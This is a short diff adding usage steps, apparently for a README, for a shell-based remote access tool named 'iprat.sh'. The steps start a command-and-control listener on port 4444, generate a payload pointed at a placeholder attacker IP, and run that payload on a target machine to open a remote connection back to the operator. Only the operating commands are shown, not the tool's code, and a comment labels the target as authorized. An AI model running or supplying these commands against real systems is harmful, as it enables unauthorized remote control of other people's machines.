@@ -1,0 +1,10 @@
+chmod +x iprat.sh
+
+# Terminal 1 — start the C2
+./iprat.sh listen 4444
+
+# Terminal 2 — generate the payload
+./iprat.sh payload <ATTACKER_IP> 4444
+
+# On target (authorized machine)
+bash iprat_payload.sh
